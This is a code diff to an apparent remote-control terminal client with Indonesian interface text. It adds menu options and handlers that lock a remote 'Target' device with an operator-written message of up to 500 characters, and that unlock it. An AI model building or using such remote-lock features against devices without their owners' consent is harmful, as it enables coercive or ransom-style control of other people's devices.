@@ -293,6 +293,7 @@ function renderApps(apps, page, source) {
 
   console.log(GREEN + 'Ketik nomor aplikasi untuk membuka.' + RESET);
   console.log(GREEN + '[n] Next   [p] Previous   [r] Refresh' + RESET);
+  console.log(GREEN + '[l] Activate Local Lock   [u] Unlock' + RESET);
   console.log(GREEN + '[0] Disconnect' + RESET);
 }
 
@@ -407,6 +408,25 @@ async function session(mode) {
       const choice = (
         await ask('\nDUAL CONTROL > ')
       ).trim().toLowerCase();
+
+      if (choice === 'l') {
+        const message = await ask('Pesan untuk Target (maks. 500 karakter): ');
+        const result = await channel.request({
+          type: 'lock',
+          token,
+          message: message.slice(0, 500)
+        });
+        console.log(result.ok ? GREEN + '[LOCK ACTIVE] ' + result.message + RESET : RED + '[FAILED] ' + (result.message || 'Gagal mengaktifkan lock.') + RESET);
+        await ask('Enter untuk kembali...');
+        continue;
+      }
+
+      if (choice === 'u') {
+        const result = await channel.request({ type: 'unlock', token });
+        console.log(result.ok ? GREEN + '[UNLOCKED] ' + result.message + RESET : RED + '[FAILED] ' + (result.message || 'Gagal menonaktifkan lock.') + RESET);
+        await ask('Enter untuk kembali...');
+        continue;
+      }
 
       if (choice === '0') break;
 
